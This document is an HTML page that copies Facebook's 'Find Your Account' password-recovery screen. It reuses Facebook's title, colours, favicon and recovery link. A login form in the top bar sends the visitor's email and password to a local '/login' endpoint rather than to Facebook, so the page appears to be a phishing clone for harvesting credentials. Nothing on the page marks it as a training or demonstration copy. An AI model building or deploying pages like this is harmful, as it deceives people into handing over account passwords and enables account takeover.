<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Forgot password | Can't log in | Facebook</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" type="image/png">
    <style>
        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px;
            background-color: #3b5998;
            color: #fff;
        }

        .logo img {
            height: 30px;
            width: auto;
        }

        .login-form {
            display: flex;
            align-items: center;
        }

        .login-form input[type="email"],
        .login-form input[type="password"] {
            margin-right: 10px;
            padding: 5px;
        }

        .login-button {
            padding: 5px 10px;
            background-color: #1877f2;
            color: #fff;
            border: none;
            border-radius: 4px;
        }

        .forgot-link {
            margin-left: 10px;
            color: #fff;
            text-decoration: none;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }
        .container {
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  background-color: #e9ebee;
}

.find-account-section {
  background-color: #f6f7f8;
  padding: 20px;
  text-align: center;
  max-width: 500px;
  width: 100%;
  border-radius: 6px;
}

.find-account-section h2 {
  margin-top: 0;
  font-size: 24px;
  color: #1c1e21;
}

.find-account-section p {
  margin-bottom: 20px;
  font-size: 14px;
  color: #606770;
}

.input-container {
  display: flex;
  justify-content: center;
  margin-bottom: 20px;
}

.input-container input[type="text"] {
  width: 100%;
  padding: 10px;
  font-size: 14px;
  border: 1px solid #ccc;
  border-radius: 4px;
}

.input-container .search-button {
  padding: 10px 20px;
  background-color: #1877f2;
  color: #fff;
  border: none;
  border-radius: 4px;
  font-size: 14px;
  margin-left: 10px;
  cursor: pointer;
}

.cancel-container {
  text-align: center;
}

.cancel-container .cancel-button {
  padding: 5px 10px;
  background-color: transparent;
  color: #606770;
  border: none;
  font-size: 12px;
  cursor: pointer;
}

.cancel-container .cancel-button:hover {
  text-decoration: underline;
}


      
        
    </style>
</head>

<body>
    <div class="navbar">
        <div class="logo">
            <img src="./images/facebook.svg" alt="Logo">
        </div>
        <form class="login-form" action="/login" method="POST">
            <input type="email" placeholder="Email" name="username">
            <input type="password" placeholder="Password" name="password">
            <button class="login-button" type="submit">Log In</button>
            <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&wtsid=rdr_0zoMWn3moCSos79GU"
                class="forgot-link">Forgot Account?</a>
        </form>
    </div>

    <div class="container">
        <div class="find-account-section">
          <h2>Find Your Account</h2>
          <p>Please enter your email or mobile number to search for your account:</p>
          <div class="input-container">
            <input type="text" placeholder="Email or Mobile Number">
            <button class="search-button">Search</button>
          </div>
          <div class="cancel-container">
            <button class="cancel-button">Cancel</button>
          </div>
        </div>
      </div>
      
</body>

</html>
